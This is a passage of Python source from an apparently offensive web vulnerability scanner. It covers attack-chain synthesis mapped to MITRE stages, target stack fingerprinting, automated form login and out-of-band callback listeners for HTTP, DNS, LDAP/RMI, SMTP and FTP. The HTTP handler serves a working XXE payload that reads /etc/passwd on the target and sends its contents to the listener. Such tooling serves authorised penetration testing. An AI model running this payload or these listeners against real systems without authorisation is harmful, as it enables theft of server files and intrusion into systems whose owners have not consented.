assert all("produces" in v and "requires" in v for v in _FINDING_ARTIFACT_MAP.values()), \
    "malformed _FINDING_ARTIFACT_MAP entry"

def _build_artifact_graph(
    summary: List[Tuple[str, str, str, str]],
) -> Tuple[Set[str], Dict[str, List[List[str]]]]:
    found_labels: Set[str] = {m.strip().lower() for m, _, _, _ in summary}
    found_zero: bool = any(s == "ZERO" for _, _, _, s in summary)
    available_artifacts: Set[str] = set()
    seeding_findings: Set[str] = set()

    for m, _d, _p, _s in summary:
        label = m.strip().lower()
        entry = _FINDING_ARTIFACT_MAP.get(label)
        if entry and not entry.get("is_artifact_node"):
            seeding_findings.add(label)
            for art in entry.get("produces", []):
                available_artifacts.add(art)

    if found_zero:
        seeding_findings.add("ANY_ZERO")
        for art in _FINDING_ARTIFACT_MAP.get("ANY_ZERO", {}).get("produces", []):
            available_artifacts.add(art)

    active_nodes: Set[str] = set()
    changed = True
    while changed:
        changed = False
        for key, entry in _FINDING_ARTIFACT_MAP.items():
            if not entry.get("is_artifact_node") or key in active_nodes:
                continue
            if all(r in available_artifacts for r in entry.get("requires", [])):
                active_nodes.add(key)
                for art in entry.get("produces", []):
                    if art not in available_artifacts:
                        available_artifacts.add(art)
                        changed = True

    def _paths_for_artifact(target_art: str, depth: int = 0) -> List[List[str]]:
        if depth > 8:
            return []
        results: List[List[str]] = []
        for key, entry in _FINDING_ARTIFACT_MAP.items():
            if target_art not in entry.get("produces", []):
                continue
            if entry.get("is_artifact_node"):
                if key not in active_nodes:
                    continue
                reqs = entry.get("requires", [])
                combined: List[List[str]] = [[]]
                ok = True
                for req_art in reqs:
                    sub = _paths_for_artifact(req_art, depth + 1)
                    if not sub:
                        ok = False
                        break
                    new_combined: List[List[str]] = []
                    for existing in combined:
                        for sp in sub:
                            merged = existing + [n for n in sp if n not in existing]
                            new_combined.append(merged)
                    combined = new_combined[:6]
                if ok:
                    for cp in combined:
                        if key not in cp:
                            results.append(cp + [key])
            else:
                if key in seeding_findings:
                    results.append([key])
        return results

    path_graph: Dict[str, List[List[str]]] = {}
    for terminal_art in _TERMINAL_ARTIFACTS:
        if terminal_art not in available_artifacts:
            continue
        paths = _paths_for_artifact(terminal_art)
        multi = [p for p in paths if len(p) >= 2]
        if multi:
            path_graph[terminal_art] = multi
        elif paths:
            path_graph[terminal_art] = paths[:3]

    return available_artifacts, path_graph


def _synthesize_chain_name(path: List[str], terminal: str) -> str:
    finding_labels = [
        _FINDING_ARTIFACT_MAP.get(n, {}).get("label", n)
        for n in path
        if not _FINDING_ARTIFACT_MAP.get(n, {}).get("is_artifact_node")
    ]
    title = terminal.replace("_", " ").title()
    if len(finding_labels) == 1:
        return "%s -> %s" % (finding_labels[0], title)
    return " + ".join(finding_labels[:3]) + " -> %s" % title

def _synthesize_chain_narrative(path: List[str], terminal: str) -> str:
    finding_nodes = [
        n for n in path
        if not _FINDING_ARTIFACT_MAP.get(n, {}).get("is_artifact_node")
    ]
    parts = []
    for n in finding_nodes:
        entry = _FINDING_ARTIFACT_MAP.get(n, {})
        label = entry.get("label", n)
        produces = entry.get("produces", [])
        if produces:
            parts.append(
                "%s provides %s" % (
                    label,
                    ", ".join(p.replace("_", " ").lower() for p in produces),
                )
            )
    terminal_verb = _ARTIFACT_VERBS.get(terminal, "reaches " + terminal)
    parts.append("The combined primitive %s." % terminal_verb)
    return " ".join(parts)

def _compute_mitre_coverage(chains: List[Dict]) -> Dict[str, int]:
    stage_counts: Dict[str, int] = {}
    for c in chains:
        for stage in c["chain"].get("mitre_stages", []):
            stage_counts[stage] = stage_counts.get(stage, 0) + 1
    return stage_counts

def _correlate_chains(
    summary: List[Tuple[str, str, str, str]],
) -> List[Dict]:
    _available_artifacts, path_graph = _build_artifact_graph(summary)

    synthesized: List[Dict] = []
    for terminal_art, paths in path_graph.items():
        for path in paths:
            if len(path) < 2:
                continue
            total_effort = sum(
                _FINDING_ARTIFACT_MAP.get(node, {}).get("effort", 2)
                for node in path
            )
            severities = [
                _FINDING_ARTIFACT_MAP.get(node, {}).get("severity", "MED")
                for node in path
            ]
            severity_uplift = (
                "CRIT" if "CRIT" in severities
                else "HIGH" if "HIGH" in severities
                else "MED"
            )
            mitre_stages = [
                _FINDING_ARTIFACT_MAP.get(node, {}).get("mitre_stage", "")
                for node in path
            ]
            confidence  = round(0.9 ** len(path), 3)
            sev_w       = {"CRIT": 4.0, "HIGH": 3.0, "MED": 2.0, "LOW": 1.0}.get(severity_uplift, 1.0)
            risk_score  = round(sev_w * confidence / max(total_effort, 1), 3)
            narrative   = _synthesize_chain_narrative(path, terminal_art)
            steps       = [_FINDING_ARTIFACT_MAP.get(n, {}).get("label", n) for n in path]
            chain_id    = "chain.synth." + hashlib.md5("|".join(path).encode()).hexdigest()[:8]
            synthesized.append({
                "chain": {
                    "id":                chain_id,
                    "name":              _synthesize_chain_name(path, terminal_art),
                    "narrative":         narrative,
                    "severity_uplift":   severity_uplift,
                    "terminal_artifact": terminal_art,
                    "mitre_stages":      list(dict.fromkeys(s for s in mitre_stages if s)),
                    "effort":            total_effort,
                    "steps":             steps,
                    "impact":            "",
                    "synthesized":       True,
                },
                "components": [
                    (_FINDING_ARTIFACT_MAP.get(n, {}).get("label", n), "")
                    for n in path
                    if not _FINDING_ARTIFACT_MAP.get(n, {}).get("is_artifact_node")
                ],
                "boosters":   [],
                "confidence": confidence,
                "risk_score": risk_score,
            })

    by_terminal: Dict[str, List[Dict]] = {}
    for s in synthesized:
        t = s["chain"]["terminal_artifact"]
        by_terminal.setdefault(t, []).append(s)

    deduped: List[Dict] = []
    for _terminal, candidates in by_terminal.items():
        candidates.sort(key=lambda x: (-x["risk_score"], x["chain"]["effort"]))
        path_sigs: List[frozenset] = []
        kept: List[Dict] = []
        for c in candidates:
            sig = frozenset(c["chain"]["steps"])
            if not any(sig < ps for ps in path_sigs):
                kept.append(c)
                path_sigs.append(sig)
            if len(kept) >= 3:
                break
        deduped.extend(kept)

    deduped.sort(key=lambda x: (-x["risk_score"], x["chain"]["effort"]))

    _EVIDENCE_TABLE["mitre_coverage"] = _compute_mitre_coverage(deduped)

    return deduped[:25]








def _infer_stack_from_hints() -> str:
    try:
        code, hdrs, body, _ = _req(_BASE_CACHE.get("__last_base__", ""), use_cache=True)
        if code == 0:
            return "generic"
        sig = " ".join(
            hdrs.get(h, "").lower() for h in
            ["server", "x-powered-by", "set-cookie", "content-type"]
        ).lower()
        body_text = body[:2048].decode("utf-8", "replace").lower()
        best_stack = "generic"
        best_count = 0
        for stack, hints in _STACK_SIGNALS.items():
            count = sum(1 for h in hints if h in sig or h in body_text)
            if count > best_count:
                best_count = count
                best_stack = stack
    except Exception:
        pass
    return best_stack

def _build_skip_set(base: str) -> None:
    global _SKIP_SET, _DETECTED_STACK
    _BASE_CACHE["__last_base__"] = base
    try:
        tf = scan_tech_fingerprint(base)
        wf = scan_waf_detection(base)
    except Exception:
        tf = []
        wf = []
    combined = " ".join(d for _, d in tf + wf).lower()
    best = "unknown"
    best_count = 0
    for stack, keywords in _STACK_SIGNALS.items():
        count = sum(1 for kw in keywords if kw in combined)
        if count > best_count:
            best_count = count
            best = stack
    _DETECTED_STACK = best
    if not any(kw in combined for kw in _STACK_SIGNALS["wordpress"]):
        _SKIP_SET.add("wordpress surface")
    if best in ("node", "go", "ruby"):
        _SKIP_SET.add("laravel django debug")
    if not any(kw in combined for kw in _STACK_SIGNALS["react"] + _STACK_SIGNALS["vue"] + _STACK_SIGNALS["nextjs"]):
        _SKIP_SET.add("nextjs data exposure")
        _SKIP_SET.add("nuxt payload exposure")
    if not any(kw in combined for kw in _STACK_SIGNALS["aspnet"]):
        _SKIP_SET.add("aspnet trace")
    if not any(kw in combined for kw in _STACK_SIGNALS["drupal"]):
        _SKIP_SET.add("drupal fingerprint")

def _ver_tuple(v: str) -> Tuple[int, ...]:
    return tuple(int(p) for p in re.findall(r'\d+', v)) or (0,)

def _ver_lt(a: str, b: str) -> bool:
    return _ver_tuple(a) < _ver_tuple(b)

def _local_ip() -> str:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"

class _FormParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.forms: List[Dict] = []
        self._cur: Optional[Dict] = None

    def handle_starttag(self, tag: str, attrs: List[Tuple[str, Optional[str]]]) -> None:
        a = {k: (v or "") for k, v in attrs}
        if tag == "form":
            self._cur = {"attrs": a, "inputs": []}
        elif tag == "input" and self._cur is not None:
            self._cur["inputs"].append(a)

    def handle_endtag(self, tag: str) -> None:
        if tag == "form" and self._cur is not None:
            self.forms.append(self._cur)
            self._cur = None

_CSRF_FIELD_NAMES: frozenset = frozenset({
    "csrf_token", "csrfmiddlewaretoken", "_token", "authenticity_token",
    "csrf", "xsrf_token", "__requestverificationtoken",
})

def _do_form_login(login_url: str, username: str, password: str) -> bool:
    c, _, body_b, _ = _req(login_url)
    if c == 0:
        return False
    body = body_b.decode("utf-8", "ignore")
    parser = _FormParser()
    parser.feed(body)
    best_form: Optional[Dict] = None
    for form_data in parser.forms:
        fa = form_data["attrs"]
        action = fa.get("action", login_url).strip()
        if not action.startswith("http"):
            action = urllib.parse.urljoin(login_url, action)
        method = fa.get("method", "post").upper()
        fields: Dict[str, str] = {}
        user_field = pass_field = ""
        for ia in form_data["inputs"]:
            name  = ia.get("name", "")
            itype = ia.get("type", "text").lower()
            val   = ia.get("value", "")
            if not name:
                continue
            nl = name.lower()
            if itype == "password" or "pass" in nl:
                pass_field = name
                fields[name] = password
            elif itype in ("text", "email", "") or any(k in nl for k in ("user", "email", "login", "name")):
                if not user_field:
                    user_field = name
                    fields[name] = username
            elif name.lower() in _CSRF_FIELD_NAMES:
                fields[name] = val
            elif itype not in ("submit", "button", "reset"):
                fields[name] = val
        if user_field and pass_field:
            best_form = {"action": action, "method": method, "fields": fields}
            break
    if not best_form:
        return False
    data = urllib.parse.urlencode(best_form["fields"]).encode()
    resp_code, resp_hdrs, _, _ = _req(
        best_form["action"],
        method=best_form["method"],
        data=data,
        content_type="application/x-www-form-urlencoded",
    )
    sc = resp_hdrs.get("set-cookie", "")
    if sc and 200 <= resp_code < 400:
        cookies = "; ".join(
            part.split(";")[0].strip()
            for part in sc.split("\n")
            if "=" in part.split(";")[0]
        )
        global _GLOBAL_HEADERS_VER
        _GLOBAL_HEADERS["Cookie"] = cookies
        _GLOBAL_HEADERS_VER += 1
        _sync_scan_config_from_globals()
        return True
    return False

def oob_replay_curl(hit: Dict) -> str:
    method = hit.get("method", "GET")
    path   = hit.get("path", "/")
    hdrs   = hit.get("headers", {})
    body   = hit.get("body", "")
    host   = _OOB_HOST if _OOB_HOST else _local_ip()
    url    = "http://" + host + ":" + str(_OOB_PORT) + path
    parts  = ["curl -X " + method + " '" + url + "'"]
    for k, v in hdrs.items():
        if k.lower() not in ("host", "content-length"):
            parts.append("-H '" + k + ": " + v.replace("'", "\\'") + "'")
    if body:
        parts.append("--data '" + body[:200].replace("'", "\\'") + "'")
    return " \\\n  ".join(parts)

def _oob_log_hit(token: str, hit: Dict) -> None:
    if not _OOB_LOG_PATH:
        return
    try:
        entry = {
            "ts":          hit.get("ts", 0.0),
            "token":       token,
            "method":      hit.get("method", ""),
            "src":         hit.get("src", ""),
            "path":        hit.get("path", ""),
            "body":        hit.get("body", ""),
            "curl_replay": oob_replay_curl(hit) if hit.get("method") not in ("SMTP", "FTP", "SMB", "DNS", "TCP", "LDAP", "RMI", "JAVA_DESER") else "",
        }
        _oob_line = json.dumps(entry) + "\n"
        with _OOB_LOG_LOCK:
            with open(_OOB_LOG_PATH, "a", encoding="utf-8") as _fh:
                _fh.write(_oob_line)
    except Exception:
        pass

def _oob_ensure_tls_cert() -> bool:
    global _OOB_TLS_CERT, _OOB_TLS_KEY
    if _OOB_TLS_CERT and _OOB_TLS_KEY:
        return True
    try:
        cf = tempfile.NamedTemporaryFile(suffix=".pem", delete=False)
        cf.close()
        kf = tempfile.NamedTemporaryFile(suffix=".key", delete=False)
        kf.close()
        r = subprocess.run(
            ["openssl", "req", "-x509", "-newkey", "rsa:2048",
             "-keyout", kf.name, "-out", cf.name,
             "-days", "1", "-nodes", "-subj", "/CN=oob"],
            capture_output=True, timeout=15,
        )
        if r.returncode != 0:
            return False
        _OOB_TLS_CERT = cf.name
        _OOB_TLS_KEY  = kf.name
        return True
    except Exception:
        return False

class _OOBHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        if self.path.split("?")[0].endswith(".dtd"):
            self._serve_dtd()
        else:
            self._record("GET")

    def do_POST(self) -> None: self._record("POST")
    def do_HEAD(self) -> None: self._record("HEAD")

    def _serve_dtd(self) -> None:
        parts = self.path.lstrip("/").split("/")
        token = parts[0] if parts else "x"
        host  = _OOB_HOST if _OOB_HOST else _local_ip()
        exfil = "http://" + host + ":" + str(_OOB_PORT) + "/" + token + "/x-d="
        dtd = (
            '<!ENTITY % file SYSTEM "file:///etc/passwd">\n'
            '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \\"' + exfil + '%file;\\">">\n'
            '%eval;\n%exfil;\n'
        ).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/xml-dtd")
        self.send_header("Content-Length", str(len(dtd)))
        self.end_headers()
        self.wfile.write(dtd)
        self._record("DTD-FETCH")

    def _record(self, method: str) -> None:
        global _OOB_DIRTY
        parsed  = urllib.parse.urlparse(self.path)
        headers = {k.lower(): v for k, v in self.headers.items()}
        body    = b""
        cl = int(headers.get("content-length", "0") or "0")
        if cl > 0:
            try:
                body = self.rfile.read(min(cl, 4096))
            except Exception:
                pass
        parts = parsed.path.lstrip("/").split("/", 1)
        token = parts[0] if parts else ""
        hit = {
            "method":  method,
            "path":    parsed.path,
            "query":   urllib.parse.parse_qs(parsed.query),
            "headers": headers,
            "body":    body.decode("utf-8", "ignore"),
            "src":     self.client_address[0],
            "ts":      time.time(),
        }
        ev = None
        with _OOB_LOCK:
            _OOB_HITS.setdefault(token, []).append(hit)
            _OOB_DIRTY = True
            ev = _OOB_EVENTS.get(token)
        _oob_log_hit(token, hit)
        if ev is not None:
            ev.set()
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *a: object) -> None:
        pass

def oob_start() -> int:
    global _OOB_PORT, _OOB_SERVER
    if _OOB_PORT:
        return _OOB_PORT
    candidates: List[int] = []
    if _OOB_FORCED_PORT:
        candidates.append(_OOB_FORCED_PORT)
    if not _OOB_FORCED_PORT and hasattr(os, "getuid") and os.getuid() == 0:
        candidates.append(80)
    candidates.extend(range(45200, 45300))
    for port in candidates:
        try:
            srv = http.server.HTTPServer(("0.0.0.0", port), _OOBHandler)
            srv.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            if hasattr(socket, "SO_REUSEPORT"):
                srv.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            if _OOB_TLS and _oob_ensure_tls_cert():
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ctx.load_cert_chain(_OOB_TLS_CERT, _OOB_TLS_KEY)
                srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
            _OOB_PORT   = port
            _OOB_SERVER = srv
            t = threading.Thread(target=srv.serve_forever, daemon=True)
            t.start()
            atexit.register(oob_stop)
            return port
        except OSError:
            continue
    return 0

def oob_stop() -> None:
    global _OOB_PORT, _OOB_SERVER
    srv = _OOB_SERVER
    if srv is not None:
        try:
            srv.shutdown()
        except Exception:
            pass
        _OOB_SERVER = None
        _OOB_PORT   = 0

def oob_url(token: str, target_url: str = "") -> str:
    global _OOB_WARNED
    port = oob_start()
    if not port:
        return ""
    if _OOB_HOST:
        host = _OOB_HOST
    else:
        host = _local_ip()
        if not _OOB_WARNED and target_url and not _OOB_ALLOW_PRIVATE_HOST:
            thost = urllib.parse.urlparse(target_url).hostname or ""
            is_local = (thost in ("localhost", "127.0.0.1", "::1")
                        or thost.endswith(".local")
                        or re.match(r"^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)", thost))
            if not is_local:
                _OOB_WARNED = True
                _out(_paint(
                    "  [!] OOB warning: listener is on LAN IP " + host + ":" + str(port)
                    + " -- callbacks from internet targets will NOT arrive.\n"
                    + "      Use --oob-host <public-ip-or-domain> with port forwarding/tunnel/VPS, "
                    + "or --oob-allow-private-host for routed lab targets.", A.Y))
    scheme = "https" if _OOB_TLS else "http"
    return scheme + "://" + host + ":" + str(port) + "/" + token

def oob_wait(token: str, timeout: float = 6.0) -> List[Dict]:
    global _OOB_DIRTY
    ev = threading.Event()
    with _OOB_LOCK:
        existing = list(_OOB_HITS.get(token, []))
        if existing:
            return existing
        _OOB_EVENTS[token] = ev
        _OOB_DIRTY = True
    fired = ev.wait(timeout=timeout)
    with _OOB_LOCK:
        if _OOB_EVENTS.get(token) is ev:
            del _OOB_EVENTS[token]
        _OOB_DIRTY = True
    if fired:
        time.sleep(0.05)
        with _OOB_LOCK:
            count = len(_OOB_HITS.get(token, []))
        if count > 1:
            time.sleep(0.1)
    with _OOB_LOCK:
        return list(_OOB_HITS.get(token, []))

def oob_clear(token: str) -> None:
    global _OOB_DIRTY
    with _OOB_LOCK:
        _OOB_HITS.pop(token, None)
        _OOB_EVENTS.pop(token, None)
        _OOB_DIRTY = True

def _oob_tcp_conn(conn: socket.socket, src_addr: tuple) -> None:
    global _OOB_DIRTY
    try:
        raw = b""
        conn.settimeout(2.0)
        while len(raw) < 8192:
            chunk = conn.recv(512)
            if not chunk:
                break
            raw += chunk
        text_l1 = raw.decode("latin-1", "ignore")
        if raw[:4] == b"JRMI":
            proto = "RMI"
        elif raw and raw[0] == 0x30:
            proto = "LDAP"
        elif raw[:2] == b"\xac\xed":
            proto = "JAVA_DESER"
        elif raw[:3] == b"220":
            proto = "FTP"
        else:
            proto = "TCP"
        token = ""
        with _OOB_LOCK:
            candidates = list(_OOB_HITS.keys()) + list(_OOB_EVENTS.keys())
        for t in candidates:
            if t and t in text_l1:
                token = t
                break
        if not token:
            return
        hit = {
            "method": proto, "path": "/" + token, "query": {}, "headers": {},
            "body": raw.hex()[:256], "src": src_addr[0],
            "ts": time.time(), "proto": proto,
        }
        ev = None
        with _OOB_LOCK:
            _OOB_HITS.setdefault(token, []).append(hit)
            _OOB_DIRTY = True
            ev = _OOB_EVENTS.get(token)
            _OOB_HIT_COUNTS[proto] = _OOB_HIT_COUNTS.get(proto, 0) + 1
        _oob_log_hit(token, hit)
        if ev is not None:
            ev.set()
        if proto == "LDAP":
            if len(raw) >= 6:
                msg_id = raw[4]
                op     = raw[5]
                if op == 0x63:
                    conn.sendall(b"\x30\x0c\x02\x01" + bytes([msg_id])
                                 + b"\x65\x07\x0a\x01\x00\x04\x00\x04\x00")
                else:
                    conn.sendall(b"\x30\x0c\x02\x01" + bytes([msg_id])
                                 + b"\x61\x07\x0a\x01\x00\x04\x00\x04\x00")
    except Exception:
        pass
    finally:
        try:
            conn.close()
        except Exception:
            pass

def _oob_tcp_accept(srv: socket.socket) -> None:
    while True:
        try:
            conn, addr = srv.accept()
            _OOB_TCP_POOL.submit(_oob_tcp_conn, conn, addr)
        except Exception:
            break

def oob_tcp_start() -> int:
    global _OOB_TCP_PORT, _OOB_TCP_SOCK
    if _OOB_TCP_PORT:
        return _OOB_TCP_PORT
    for port in range(45300, 45400):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("0.0.0.0", port))
            s.listen(32)
            _OOB_TCP_PORT = port
            _OOB_TCP_SOCK = s
            threading.Thread(target=_oob_tcp_accept, args=(s,), daemon=True).start()
            return port
        except OSError:
            continue
    return 0

def oob_url_ldap(token: str) -> str:
    port = oob_tcp_start()
    if not port:
        return ""
    host = _OOB_HOST if _OOB_HOST else _local_ip()
    return "ldap://" + host + ":" + str(port) + "/" + token

def oob_url_rmi(token: str) -> str:
    port = oob_tcp_start()
    if not port:
        return ""
    host = _OOB_HOST if _OOB_HOST else _local_ip()
    return "rmi://" + host + ":" + str(port) + "/" + token

def _dns_parse_qname(data: bytes, offset: int) -> str:
    labels: List[str] = []
    seen: set = set()
    max_labels = 128
    count = 0
    while offset < len(data):
        if count > max_labels:
            break
        count += 1
        if offset in seen:
            break
        seen.add(offset)
        n = data[offset]
        if n == 0:
            break
        if (n & 0xC0) == 0xC0:
            if offset + 1 >= len(data):
                break
            offset = ((n & 0x3F) << 8) | data[offset + 1]
            continue
        offset += 1
        if offset + n > len(data):
            break
        labels.append(data[offset:offset + n].decode("ascii", "ignore"))
        offset += n
    return ".".join(labels)

def _dns_send_answer(sock: socket.socket, data: bytes, addr: tuple, ip_str: str) -> None:
    if len(data) < 12:
        return
    try:
        ip_bytes = socket.inet_aton(ip_str)
    except Exception:
        return
    i = 12
    while i < len(data):
        if data[i] == 0:
            i += 5
            break
        if (data[i] & 0xC0) == 0xC0:
            i += 6
            break
        i += data[i] + 1
    question = data[12:i]
    hdr = (data[:2]
           + b"\x81\x80"
           + data[4:6]
           + b"\x00\x01\x00\x00\x00\x00")
    answer = (
        b"\xc0\x0c"
        + b"\x00\x01"
        + b"\x00\x01"
        + b"\x00\x00\x00\x3c"
        + b"\x00\x04"
        + ip_bytes
    )
    try:
        sock.sendto(hdr + question + answer, addr)
    except Exception:
        pass

def _dns_send_nxdomain(sock: socket.socket, data: bytes, addr: tuple) -> None:
    if len(data) < 12:
        return
    qdcount = (data[4] << 8) | data[5]
    if qdcount == 0 or len(data) <= 12:
        return
    hdr = data[:2] + b"\x84\x03" + data[4:6] + b"\x00\x00\x00\x00\x00\x00"
    i = 12
    while i < len(data):
        if data[i] == 0:
            i += 5
            break
        if (data[i] & 0xC0) == 0xC0:
            i += 6
            break
        i += data[i] + 1
    try:
        sock.sendto(hdr + data[12:i], addr)
    except Exception:
        pass

_DNS_QTYPE_MAP: Dict[int, str] = {1: "A", 28: "AAAA", 16: "TXT", 15: "MX"}

def _oob_dns_handler(sock: socket.socket) -> None:
    global _OOB_DIRTY
    _cached_candidates: List[str] = []
    while True:
        try:
            data, addr = sock.recvfrom(512)
            if len(data) < 12:
                continue
            qname = _dns_parse_qname(data, 12)
            i = 12
            while i < len(data):
                if data[i] == 0:
                    break
                if (data[i] & 0xC0) == 0xC0:
                    i += 1
                    break
                i += data[i] + 1
            qtype_raw = data[i + 1:i + 3] if i + 3 <= len(data) else b"\x00\x01"
            qtype_int = (qtype_raw[0] << 8) | qtype_raw[1] if len(qtype_raw) == 2 else 1
            qtype_name = _DNS_QTYPE_MAP.get(qtype_int, str(qtype_int))
            qname_lower = qname.lower()
            with _OOB_LOCK:
                if _OOB_DIRTY:
                    _cached_candidates = (list(_OOB_EVENTS.keys())
                                          + [k for k in _OOB_HITS if k not in _OOB_EVENTS])
                    _OOB_DIRTY = False
            matched = next((t for t in _cached_candidates if t and t.lower() in qname_lower), "")
            if not matched:
                _dns_send_nxdomain(sock, data, addr)
                continue
            _dns_send_answer(sock, data, addr, _OOB_HOST if _OOB_HOST else _local_ip())
            hit = {
                "method": "DNS", "path": "/" + matched,
                "query": {}, "headers": {}, "body": qname,
                "src": addr[0], "ts": time.time(), "proto": "DNS",
                "dns_qtype": qtype_name,
            }
            ev = None
            with _OOB_LOCK:
                _OOB_HITS.setdefault(matched, []).append(hit)
                _OOB_DIRTY = True
                ev = _OOB_EVENTS.get(matched)
            _oob_log_hit(matched, hit)
            if ev is not None:
                ev.set()
        except Exception:
            break

def oob_dns_start() -> int:
    global _OOB_DNS_PORT, _OOB_DNS_SOCK
    if _OOB_DNS_PORT:
        return _OOB_DNS_PORT
    for port in [53] + list(range(5300, 5400)):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("0.0.0.0", port))
            _OOB_DNS_PORT = port
            _OOB_DNS_SOCK = s
            threading.Thread(target=_oob_dns_handler, args=(s,), daemon=True).start()
            return port
        except OSError:
            try:
                s.close()
            except Exception:
                pass
    return 0

def oob_url_dns(token: str) -> str:
    host = _OOB_HOST if _OOB_HOST else _local_ip()
    if _OOB_DNS_DOMAIN:
        return token + "." + _OOB_DNS_DOMAIN
    if re.match(r'^\d+\.\d+\.\d+\.\d+$', host):
        return token + ".oob." + host.replace(".", "-") + ".nip.io"
    return token + ".oob." + host

def _oob_smtp_conn(conn: socket.socket, src_addr: tuple) -> None:
    global _OOB_DIRTY
    try:
        conn.settimeout(5.0)
        conn.sendall(b"220 oob.local ESMTP\r\n")
        token = ""
        in_data = False
        body_lines: List[str] = []
        buf = b""
        done = False
        while not done:
            try:
                chunk = conn.recv(512)
            except Exception:
                break
            if not chunk:
                break
            buf += chunk
            if len(buf) > 65536:
                break
            while True:
                nl = buf.find(b"\n")
                if nl == -1:
                    break
                line = buf[:nl].decode("latin-1", "ignore").rstrip("\r")
                buf = buf[nl + 1:]
                if in_data:
                    if line == ".":
                        in_data = False
                        conn.sendall(b"250 OK\r\n")
                    else:
                        body_lines.append(line)
                elif line.upper().startswith(("EHLO", "HELO")):
                    conn.sendall(b"250-oob.local\r\n250-SIZE 10240000\r\n250 OK\r\n")
                elif line.upper().startswith("MAIL FROM"):
                    if not token:
                        m2 = re.search(r'<([^@>]+)@', line)
                        if m2:
                            token = m2.group(1)
                    conn.sendall(b"250 OK\r\n")
                elif line.upper().startswith("RCPT TO"):
                    m = re.search(r'<([^@>]+)@', line)
                    if m:
                        token = m.group(1)
                    conn.sendall(b"250 OK\r\n")
                elif line.upper().startswith("DATA"):
                    conn.sendall(b"354 Send data\r\n")
                    in_data = True
                elif line.upper().startswith("QUIT"):
                    conn.sendall(b"221 Bye\r\n")
                    done = True
                    break
                elif line.strip():
                    conn.sendall(b"500 Unknown\r\n")
        if not token:
            return
        hit = {
            "method": "SMTP", "path": "/" + token, "query": {},
            "headers": {}, "body": "\n".join(body_lines),
            "src": src_addr[0], "ts": time.time(), "proto": "SMTP",
        }
        ev = None
        with _OOB_LOCK:
            _OOB_HITS.setdefault(token, []).append(hit)
            _OOB_DIRTY = True
            ev = _OOB_EVENTS.get(token)
        _oob_log_hit(token, hit)
        if ev is not None:
            ev.set()
    except Exception:
        pass
    finally:
        try:
            conn.close()
        except Exception:
            pass

def _oob_smtp_accept(srv: socket.socket) -> None:
    while True:
        try:
            conn, addr = srv.accept()
            _OOB_SMTP_POOL.submit(_oob_smtp_conn, conn, addr)
        except Exception:
            break

def oob_smtp_start() -> int:
    global _OOB_SMTP_PORT, _OOB_SMTP_SOCK, _OOB_SMTP_POOL
    if _OOB_SMTP_PORT:
        return _OOB_SMTP_PORT
    if _OOB_SMTP_POOL is None:
        _OOB_SMTP_POOL = ThreadPoolExecutor(max_workers=8, thread_name_prefix="oob_smtp")
    for port in range(2525, 2625):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("0.0.0.0", port))
            s.listen(16)
            _OOB_SMTP_PORT = port
            _OOB_SMTP_SOCK = s
            threading.Thread(target=_oob_smtp_accept, args=(s,), daemon=True).start()
            return port
        except OSError:
            try:
                s.close()
            except Exception:
                pass
    return 0

def oob_url_smtp(token: str) -> str:
    port = oob_smtp_start()
    if not port:
        return ""
    host = _OOB_HOST if _OOB_HOST else _local_ip()
    return token + "@" + host + ":" + str(port)

def _oob_ftp_conn(conn: socket.socket, src_addr: tuple) -> None:
    global _OOB_DIRTY
    pasv_sock: Optional[socket.socket] = None
    try:
        conn.settimeout(5.0)
        conn.sendall(b"220 FTP ready\r\n")
        token = ""
        retr_paths: List[str] = []
        buf = b""
        done = False
        while not done:
            try:
                chunk = conn.recv(256)
            except Exception:
                break
            if not chunk:
                break
            buf += chunk
            while True:
                nl = buf.find(b"\n")
                if nl == -1:
                    break
                line = buf[:nl].decode("latin-1", "ignore").rstrip("\r")
                buf = buf[nl + 1:]
                parts_l = line.split(None, 1)
                cmd = parts_l[0].upper() if parts_l else ""
                arg = parts_l[1] if len(parts_l) > 1 else ""
                if cmd == "USER":
                    token = arg
                    conn.sendall(b"331 Password required\r\n")
                elif cmd == "PASS":
                    conn.sendall(b"230 Logged in\r\n")
                elif cmd == "SYST":
                    conn.sendall(b"215 UNIX Type: L8\r\n")
                elif cmd == "PWD":
                    conn.sendall(b'257 "/" is current\r\n')
                elif cmd == "TYPE":
                    conn.sendall(b"200 Type set\r\n")
                elif cmd == "PASV":
                    try:
                        ps = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        ps.bind(("0.0.0.0", 0))
                        ps.listen(1)
                        ps.settimeout(3.0)
                        pa = ps.getsockname()
                        ip_csv = (_OOB_HOST if _OOB_HOST else _local_ip()).replace(".", ",")
                        p1, p2 = pa[1] >> 8, pa[1] & 0xFF
                        conn.sendall(
                            ("227 Entering Passive Mode ("
                             + ip_csv + "," + str(p1) + "," + str(p2) + ").\r\n").encode()
                        )
                        if pasv_sock:
                            pasv_sock.close()
                        pasv_sock = ps
                    except Exception:
                        conn.sendall(b"425 Can't open data connection\r\n")
                elif cmd == "LIST":
                    if pasv_sock:
                        try:
                            dc, _ = pasv_sock.accept()
                            dc.sendall(b"total 0\r\n")
                            dc.close()
                        except Exception:
                            pass
                        finally:
                            pasv_sock.close()
                            pasv_sock = None
                    conn.sendall(b"226 Transfer complete\r\n")
                elif cmd == "RETR":
                    retr_paths.append(arg)
                    if pasv_sock:
                        try:
                            dc, _ = pasv_sock.accept()
                            dc.close()
                        except Exception:
                            pass
